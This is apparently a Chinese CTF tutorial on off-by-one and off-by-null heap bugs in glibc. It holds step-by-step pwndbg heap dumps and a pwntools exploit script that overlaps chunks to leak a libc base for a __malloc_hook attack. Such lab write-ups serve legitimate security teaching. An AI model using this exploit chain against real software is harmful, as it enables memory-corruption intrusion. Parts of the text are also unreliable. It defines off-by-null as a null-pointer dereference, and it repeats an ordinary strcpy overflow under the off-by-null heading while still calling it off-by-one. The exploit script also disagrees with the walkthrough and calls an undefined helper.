# pwn的堆中如何使用off by one 和off by null的详细解析以及每一步的调试过程-先知社区

> **来源**: https://xz.aliyun.com/news/16330  
> **文章ID**: 16330

---

---

title: "off by one off by null漏洞学习"  
author: "kkup008"  
date: "2024-12-23" # YYYY-MM-DD

## tags: ["off by one", "堆的基础", "libc中堆的溢出", "off by null"] # 文章标签

# off by one And off by null

## 1. off by one漏洞介绍

off by one 是一种比较老套的漏洞利用方式，主要是发生在代码对字节的处理不妥当导致。这里我们详细介绍一下 off by one 漏洞的学习。首先，off by one 最通俗易懂的定义是：在处理数组或缓冲区时，代码在边界判断上犯了错误，导致访问超出范围的内存。

### 2.1 off by one 漏洞的机制

* off by one 漏洞通常发生在对数组或缓冲区的操作中，例如在循环中未正确处理边界条件。
* 攻击者可以利用这种漏洞来修改内存中的数据，可能导致程序崩溃或执行恶意代码。

### 2.2 漏洞示例

以下是一个简单的 C 语言示例，展示了如何发生 off by one 漏洞：

```
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[10];
    // 漏洞：没有正确处理输入的长度
    strcpy(buffer, input);
}

int main() {
    char large_input[20] = "This is a long input";
    vulnerable_function(large_input);
    return 0;
}

```

### 2.3 环境展示

目前环境如下:

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5aae7024e000
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x5aae7024e020              ---->0x***e020 -  0x
Size: 0xa0 (with flag bits: 0xa1)

Allocated chunk
Addr: 0x5aae7024e0c0
Size: 0x00 (with flag bits: 0x00)

```

```
$ add(0x18)  #chunk0
  add(0x10)  #chunk1
  add(0x90)  #chunk2
  add(0x10)  #chunk3
  edit(0,(0x18+1),b'a'*0x10+p64(0x20)+p8(0xa1))

```

```
此时堆地址如下所示:
pwndbg> x/40gx 0x5aae7024e000
0x5aae7024e000: 0x0000000000000000  0x0000000000000021   
0x5aae7024e010: 0x6161616161616161  0x6161616161616161
0x5aae7024e020: 0x0000000000000020  0x00000000000000a1    --->此处伪造一个PREV_SIZE和一个SIZE  原本是0x21
0x5aae7024e030: 0x0000000000000000  0x0000000000000000
0x5aae7024e040: 0x0000000000000000  0x00000000000000a1
0x5aae7024e050: 0x0000000000000000  0x0000000000000000
0x5aae7024e060: 0x0000000000000000  0x0000000000000000
0x5aae7024e070: 0x0000000000000000  0x0000000000000000
0x5aae7024e080: 0x0000000000000000  0x0000000000000000
0x5aae7024e090: 0x0000000000000000  0x0000000000000000
0x5aae7024e0a0: 0x0000000000000000  0x0000000000000000
0x5aae7024e0b0: 0x0000000000000000  0x0000000000000000
0x5aae7024e0c0: 0x0000000000000000  0x0000000000000000
0x5aae7024e0d0: 0x0000000000000000  0x0000000000000000    --->原本的chunk结束位置
0x5aae7024e0e0: 0x0000000000000000  0x0000000000000021
0x5aae7024e0f0: 0x0000000000000000  0x0000000000000000
0x5aae7024e100: 0x0000000000000000  0x0000000000020f01

```

### 2.4 攻击手法

1.泄露libc(有show函数)  
充分利用offbyone创造的环境,即伪造的size->0xa1,可以实现堆块的重叠.

```
pwndbg> x/40gx 0x5aae7024e000
0x5aae7024e000: 0x0000000000000000  0x0000000000000021
0x5aae7024e010: 0x6161616161616161  0x6161616161616161
0x5aae7024e020: 0x0000000000000020  0x00000000000000a1   --->start
0x5aae7024e030: 0x0000000000000000  0x0000000000000000
0x5aae7024e040: 0x0000000000000000  0x00000000000000a1
0x5aae7024e050: 0x0000000000000000  0x0000000000000000
0x5aae7024e060: 0x0000000000000000  0x0000000000000000
0x5aae7024e070: 0x0000000000000000  0x0000000000000000                      这部分是我们伪造后的chunk
0x5aae7024e080: 0x0000000000000000  0x0000000000000000                      但是我们要绕过一些检查,修改如下
0x5aae7024e090: 0x0000000000000000  0x0000000000000000
0x5aae7024e0a0: 0x0000000000000000  0x0000000000000000
0x5aae7024e0b0: 0x0000000000000000  0x0000000000000000
0x5aae7024e0c0: 0x0000000000000000  0x0000000000000000   --->end   
0x5aae7024e0d0: 0x0000000000000000  0x0000000000000000
0x5aae7024e0e0: 0x0000000000000000  0x0000000000000021
0x5aae7024e0f0: 0x0000000000000000  0x0000000000000000
0x5aae7024e100: 0x0000000000000000  0x0000000000020f01

```

目前环境如下

```
pwndbg> heap
pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.

Allocated chunk | PREV_INUSE
Addr: 0x5e99ad401000
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x5e99ad401020
Size: 0xa0 (with flag bits: 0xa1)

Allocated chunk | PREV_INUSE
Addr: 0x5e99ad4010c0
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x5e99ad4010e0
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x5e99ad401100
Size: 0x20f00 (with flag bits: 0x20f01)

```

```
$ edit(2,0x80,p64(0)*14 + p64(0xa0) + p64(0x21))

```

如下:

```
pwndbg> x/50gx 0x5e99ad401000
0x5e99ad401000: 0x0000000000000000  0x0000000000000021     ?chunk0
0x5e99ad401010: 0x6161616161616161  0x6161616161616161
0x5e99ad401020: 0x0000000000000020  0x00000000000000a1     >chunk1
0x5e99ad401030: 0x0000000000000000  0x0000000000000000
0x5e99ad401040: 0x0000000000000000  0x00000000000000a1     >chunk2
0x5e99ad401050: 0x0000000000000000  0x0000000000000000
0x5e99ad401060: 0x0000000000000000  0x0000000000000000
0x5e99ad401070: 0x0000000000000000  0x0000000000000000
0x5e99ad401080: 0x0000000000000000  0x0000000000000000
0x5e99ad401090: 0x0000000000000000  0x0000000000000000
0x5e99ad4010a0: 0x0000000000000000  0x0000000000000000
0x5e99ad4010b0: 0x0000000000000000  0x0000000000000000
0x5e99ad4010c0: 0x00000000000000a0  0x0000000000000021     >fake chunk 2 end -->绕过malloc检查
0x5e99ad4010d0: 0x0000000000000000  0x0000000000000000
0x5e99ad4010e0: 0x0000000000000000  0x0000000000000021     >real chunk 2 end
0x5e99ad4010f0: 0x0000000000000000  0x0000000000000000
0x5e99ad401100: 0x0000000000000000  0x0000000000020f01

```

此时已经出现了堆块的重叠,在此状态下

```
$ delete(1)

```

这样做的目的是为了让chunk1进入unsortedbin,由于此时

```
Allocated chunk | PREV_INUSE
Addr: 0x5e99ad401020
Size: 0xa0 (with flag bits: 0xa1)

```

堆块已经被修改为0xa1,所以释放的大小也为0xa1,此时释放后如下

```
pwndbg> heap
pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.

Allocated chunk | PREV_INUSE
Addr: 0x56c56fb79000
Size: 0x20 (with flag bits: 0x21)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x56c56fb79020
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x7f589a7c4b78
bk: 0x7f589a7c4b78

Allocated chunk
Addr: 0x56c56fb790c0
Size: 0x20 (with flag bits: 0x20)

Allocated chunk | PREV_INUSE
Addr: 0x56c56fb790e0
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x56c56fb79100
Size: 0x20f00 (with flag bits: 0x20f01)

pwndbg> x/50gx 0x56c56fb79000
0x56c56fb79000: 0x0000000000000000  0x0000000000000021
0x56c56fb79010: 0x6161616161616161  0x6161616161616161
0x56c56fb79020: 0x0000000000000020  0x00000000000000a1     >chunk1已经被释放,此时进入unsorted bin
0x56c56fb79030: 0x00007f589a7c4b78  0x00007f589a7c4b78
0x56c56fb79040: 0x0000000000000000  0x00000000000000a1
0x56c56fb79050: 0x0000000000000000  0x0000000000000000
0x56c56fb79060: 0x0000000000000000  0x0000000000000000
0x56c56fb79070: 0x0000000000000000  0x0000000000000000
0x56c56fb79080: 0x0000000000000000  0x0000000000000000
0x56c56fb79090: 0x0000000000000000  0x0000000000000000
0x56c56fb790a0: 0x0000000000000000  0x0000000000000000
0x56c56fb790b0: 0x0000000000000000  0x0000000000000000     >chunk1 end
0x56c56fb790c0: 0x00000000000000a0  0x0000000000000020     >PREV_INUSE位被修改,前一个块已被释放
0x56c56fb790d0: 0x0000000000000000  0x0000000000000000
0x56c56fb790e0: 0x0000000000000000  0x0000000000000021
0x56c56fb790f0: 0x0000000000000000  0x0000000000000000
0x56c56fb79100: 0x0000000000000000  0x0000000000020f01
此时chunk如下所示:
chunk0->0x21
chunk1->0xa1   ->已释放
chunk2->0x21
chunk3->0x21

```

此时重新申请一个0x90的chunk,将刚刚伪造的chunk申请回来

```
$ add(0x90)    #chunk overlap

```

```
pwndbg> x/50gx 0x58eb4e7cd000
0x58eb4e7cd000: 0x0000000000000000  0x0000000000000021
0x58eb4e7cd010: 0x6161616161616161  0x6161616161616161
0x58eb4e7cd020: 0x0000000000000020  0x00000000000000a1
0x58eb4e7cd030: 0x0000000000000000  0x0000000000000000   
0x58eb4e7cd040: 0x0000000000000000  0x0000000000000000   -->原本的chunk size位也被清空(本题使用的calloc函数)
0x58eb4e7cd050: 0x0000000000000000  0x0000000000000000
0x58eb4e7cd060: 0x0000000000000000  0x0000000000000000
0x58eb4e7cd070: 0x0000000000000000  0x0000000000000000
0x58eb4e7cd080: 0x0000000000000000  0x0000000000000000
0x58eb4e7cd090: 0x0000000000000000  0x0000000000000000
0x58eb4e7cd0a0: 0x0000000000000000  0x0000000000000000
0x58eb4e7cd0b0: 0x0000000000000000  0x0000000000000000
0x58eb4e7cd0c0: 0x0000000000000000  0x0000000000000021   -->此时prvesize被清除,PREV_INUSE位被修改
0x58eb4e7cd0d0: 0x0000000000000000  0x0000000000000000
0x58eb4e7cd0e0: 0x0000000000000000  0x0000000000000021
0x58eb4e7cd0f0: 0x0000000000000000  0x0000000000000000
0x58eb4e7cd100: 0x0000000000000000  0x0000000000020f01

```

上述内存经过多次修改,在此状态下看到的内存是正常的,可要是按照代码的逻辑地址来看,还是有一些瑕疵的  
比如此时chunk2的位置确实是有一个size为0xa1的chunk或者说c语言代码里note[2]此时的指向是这里,所以我们要想删除chunk2,必须要还原此处代码

```
$ edit(1,0x20,p64(0)*2 + p64(0x20) + p64(0xa1))

```

这样做是为了方便删除chunk2,使其进入unsorted bin里去,这样fd和bk指针我们就能泄露出来,因为我们如果不把chunk2的size位恢复过来  
就会导致chunk的位置识别到0x58eb4e7cd0c0这个位置,而实际上,我们是要把这个fd指针放到chunk1的内部  
而现在恢复了chunk2之后,删除chunk2就会导致

```
pwndbg> x/50gx 0x6480de928000
0x6480de928000: 0x0000000000000000  0x0000000000000021
0x6480de928010: 0x6161616161616161  0x6161616161616161
0x6480de928020: 0x0000000000000020  0x00000000000000a1
0x6480de928030: 0x0000000000000000  0x0000000000000000
0x6480de928040: 0x0000000000000000  0x00000000000000a1
0x6480de928050: 0x00007d2851dc4b78  0x00007d2851dc4b78     --->fd和bk指针在chunk1内 
0x6480de928060: 0x0000000000000000  0x0000000000000000         此时只要show(1)便可接收到0x6480de928030往后0x90的数据
0x6480de928070: 0x0000000000000000  0x0000000000000000         自然也就包括此时的指针
0x6480de928080: 0x0000000000000000  0x0000000000000000
0x6480de928090: 0x0000000000000000  0x0000000000000000
0x6480de9280a0: 0x0000000000000000  0x0000000000000000
0x6480de9280b0: 0x0000000000000000  0x0000000000000000
0x6480de9280c0: 0x0000000000000000  0x0000000000000021
0x6480de9280d0: 0x0000000000000000  0x0000000000000000
0x6480de9280e0: 0x00000000000000a0  0x0000000000000020
0x6480de9280f0: 0x0000000000000000  0x0000000000000000
0x6480de928100: 0x0000000000000000  0x0000000000020f01

```

此时show(1)便泄露了libc地址

```
p.recv(0x20)
libcBase = u64(p.recv(6).ljust(8,b'\x00')) - 0x3c4b78   #libc-2.23为例

```

这样便得到了libc,然后可以打malloc\_hook,malloc\_hook结构体的攻击下一章在写,这篇碰巧有个例子就来简单的描述一下

## 2.5 exp:

```
def add(size):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline(str(size))

def edit(index,size,data):
    p.recvuntil('choice: ')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(index))
    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('content:')
    p.send(data)

def delete(index):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(str(index))

def show(index):
    p.recvuntil('choice: ')
    p.sendline('4')
    p.recvuntil('index:')
    p.sendline(str(index)) 

malloc_hook=libc.symbols['__malloc_hook']
realloc_hook=libc.symbols['realloc']

print(hex(malloc_hook))
print(hex(realloc_hook))

add(0x18)
add(0x10)
add(0x90)
add(0x10)
edit(0,34,b'a'*0x10+p64(0x20)+p8(0xa1))
edit(2,0x80,p64(0)*14 + p64(0xa0) + p64(0x21))
delete(1)
add(0x90)
duan()
edit(1,0x20,p64(0)*2 + p64(0x20) + p64(0xa1))
delete(2)
show(1)
ru("content: ")
p.recv(0x20)
libcBase = u64(p.recv(6).ljust(8,b'\x00')) - 0x3c4b78

```

### 2.6 总结

遇到堆题,没有直接的systemcall的情况下,我们一般要泄露libc地址,泄露libc过程中,如果有show函数,我们一般的做法是泄露  
unsortedbin的指针,而后可以进行各种攻击.  
我们首先需要的是释放chunk2,让其进入到unsortedbin里面去,但是我们发现释放进去之后便没有办法进行show来获得libc  
这时我们想到了修改chunk1的size,让他包含chunk2的fd和bk指针这样便可以通过show来实现,那么要想修改chunk1的size  
并且可以让程序识别到每一个chunk,那么最简单的办法就是chunk1和chunk2的size大小交换,这样chunk3可以被识别到我们也可以完成fd指针的获取  
交换之后由于本身note[1]和note[2](堆块的地址)之间的总共大小是一样的,所以我们修改完size之后不会影响别的  
但是要注意delete2的时候,由于此时note[2]的位置被calloc清空了,我们需要恢复他的size位在删除,不然会报错,检测不到此chunk  
恢复之后在删除,即可完成泄露过程.  
当然off by one只是一种漏洞点,具体的利用手法要搭配别的操作来进行.

## off by null

### 2.1 漏洞介绍

off by null 漏洞是指在代码中对指针的处理不当，导致程序在解引用空指针时发生错误。通常，这种漏洞会导致程序崩溃或未定义的行为。  
一般情况下,我们可以理解为a[10]中,有这样一条指令

```
int a[10];
a[9] = 0;
int *b;
b = a;
这样看可能不是很明显,但是如果我们设置的只能接收八位数据,显然第九位改为0有可能会被利用

```

### 2.2 漏洞示例

以下是一个简单的 C 语言示例，展示了如何发生 off by one 漏洞：

```
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[10];
    // 漏洞：没有正确处理输入的长度
    strcpy(buffer, input);
}

int main() {
    char large_input[20] = "This is a long input";
    vulnerable_function(large_input);
    return 0;
}

```

### 2.3 off by null 的利用

一般情况下offbynull的利用都是通过把size位的最低为设置位0,比如0x21改为了0x20,这种小小的改变看起来没有什么作用,可是实际上威力巨大  
在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev\_in\_use 位被清，这样前块会被认为是 free 块。  
（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。(下一篇文章会介绍)  
（2） 另外，这时 prev\_size 域就会启用，就可以伪造 prev\_size ，从而造成块之间发生重叠。  
此方法的关键在于 unlink 的时候没有检查按照 prev\_size 找到的块的大小与prev\_size 是否一致。

# 适用于2.29以前的版本

### 2.4 总结

off by null 一般情况下仅仅只是作为一个漏洞点进行处理,而不能将其当成攻击手法
